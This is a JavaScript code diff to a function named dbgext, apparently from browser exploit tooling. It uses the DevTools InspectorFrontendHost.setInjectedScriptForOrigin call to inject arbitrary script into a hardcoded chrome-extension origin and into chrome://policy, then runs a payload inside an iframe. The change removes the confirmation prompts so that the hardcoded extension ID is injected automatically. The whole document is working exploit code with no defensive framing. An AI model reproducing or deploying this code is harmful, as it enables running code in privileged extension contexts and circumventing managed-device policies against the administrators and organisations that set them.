@@ -211,46 +211,39 @@
                     }
                 }
             }
-            function dbgext(cleanup, id, payload) {
-                let x = id;
-                while (!x) {
-                    x = prompt("all u gotta do is press enter... already autoentered", "gndmhdcefbhlchkhipcnnbkcmicncehk");
-                    if (x === "cancel") {
-                        return;
-                    }
-                }
-                let path = 'manifest.json';
-                let is_pdf = false;
-                let injected = payload ?? payload_swamp.toString();
-                if (x === pdfId) {
-                    path = "index.html"; // pdf viewer hack
-                    is_pdf = true;
-                    const b = prompt("all u gotta do is press enter... already autoentered", "gndmhdcefbhlchkhipcnnbkcmicncehk");
-                    if (!b) return;
-                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
-                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
-                    
-                }
-                const URL_1 = `chrome-extension://${x ??
-                    alert("NOTREACHED")}/${path}`;
-                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
-                const ifr = document.createElement("iframe");
-                ifr.src = URL_1;
-                document.body.appendChild(ifr);
-                const ifrid = globalMap.push(ifr) - 1;
-                ifr.idx = ifrid;
-                ifr.onload = function () {
+            
+function dbgext(cleanup, id, payload) {
+    let x = id || "gndmhdcefbhlchkhipcnnbkcmicncehk"; // Automatically input the hardcoded value if id is not provided
+    let path = 'manifest.json';
+    let is_pdf = false;
+    let injected = payload ?? payload_swamp.toString();
+    
+    if (x === pdfId) {
+        path = "index.html"; // pdf viewer hack
+        is_pdf = true;
+        let b = "gndmhdcefbhlchkhipcnnbkcmicncehk"; // Automatically input the hardcoded value
+        injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
+        InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b + '//');
+    }
 
-                    ifr.contentWindow.postMessage({
-                        type: "uidpass", passcode:
-                            ifrid,
-                        cleanup: cleanup
-                    }, '*');
-                    // console.log('hi');
-                }
-                // alert(1);
+    const URL_1 = `chrome-extension://${x}/${path}`;
+    InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
+    
+    const ifr = document.createElement("iframe");
+    ifr.src = URL_1;
+    document.body.appendChild(ifr);
 
-            }
+    const ifrid = globalMap.push(ifr) - 1;
+    ifr.idx = ifrid;
+
+    ifr.onload = function () {
+        ifr.contentWindow.postMessage({
+            type: "uidpass", passcode: ifrid,
+            cleanup: cleanup
+        }, '*');
+    }
+}
+
             document.querySelector('#extdbg').onclick = function () {
                 dbgext(false);
             }
